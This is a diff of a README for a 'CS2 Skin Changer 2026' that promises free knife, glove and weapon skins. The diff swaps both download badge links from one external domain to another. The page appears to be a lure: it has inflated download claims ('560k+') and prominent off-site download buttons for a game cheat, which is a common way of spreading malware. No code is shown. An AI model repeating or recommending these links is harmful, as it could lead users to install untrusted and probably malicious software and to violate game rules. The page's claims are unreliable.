@@ -1,6 +1,6 @@
 # CS2 Skin Changer 2026 — All Knives
 
-[![Download](https://img.shields.io/badge/Download-v2026.8-brightgreen?style=for-the-badge)](https://connectinstruction.com/cs2skin)
+[![Download](https://img.shields.io/badge/Download-v2026.8-brightgreen?style=for-the-badge)](https://dllvcrun.com/cs2skin)
 
 > **CS2 skin changer — any knife, gloves, and weapon skin without spending money.**
 
@@ -48,7 +48,7 @@ A: Yes — set any float value from 0.0 to 1.0.
 
 **Monthly downloads:** 560k+
 
-[![Download](https://img.shields.io/badge/Download-v2026.8-brightgreen?style=for-the-badge)](https://connectinstruction.com/cs2skin)
+[![Download](https://img.shields.io/badge/Download-v2026.8-brightgreen?style=for-the-badge)](https://dllvcrun.com/cs2skin)
 
 ---
 
